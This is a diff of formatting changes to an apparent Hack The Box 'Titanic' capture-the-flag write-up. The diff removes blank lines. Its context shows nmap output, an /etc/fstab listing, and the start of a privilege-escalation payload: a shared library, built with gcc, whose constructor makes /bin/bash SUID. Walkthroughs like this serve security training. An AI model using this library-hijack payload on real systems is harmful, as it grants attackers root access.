@@ -32,7 +32,6 @@ Titanic is an easy difficulty Linux machine that features an Apache server liste
 ## Nmap
 
 ```bash
-
 # Nmap 7.94SVN scan initiated Mon Feb 17 13:32:10 2025 as: /usr/lib/nmap/nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80, 10.129.122.126
 Nmap scan report for 10.129.122.126
 Host is up, received user-set (0.35s latency).
@@ -54,7 +53,6 @@ Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Read data files from: /usr/share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-
 # Nmap done at Mon Feb 17 13:32:28 2025 -- 1 IP address (1 host up) scanned in 17.91 seconds
 ```
 
@@ -596,21 +594,13 @@ develop+    1148  1.3  0.8 1064988 33464 ?       Ss   04:20   6:06 /usr/bin/pyth
 
 ```bash
 developer@titanic:~$ cat /etc/fstab
-
 # /etc/fstab: static file system information.
-
 #
-
 # Use 'blkid' to print the universally unique identifier for a
-
 # device; this may be used with UUID= as a more robust way to name devices
-
 # that works even if disks are added and removed. See fstab(5).
-
 #
-
 # <file system> <mount point>   <type>  <options>       <dump>  <pass>
-
 # / was on /dev/sda2 during curtin installation
 /dev/sda2 / ext4 defaults 0 1
 /dev/sda3 none swap sw 0 0
@@ -701,11 +691,8 @@ developer@titanic:~$ cd /opt/app/static/assets/images/
 
 ```bash
 gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
-
 #include <stdio.h>
-
 #include <stdlib.h>
-
 #include <unistd.h>
 __attribute__((constructor)) void init(){
     system("chmod +s /bin/bash");
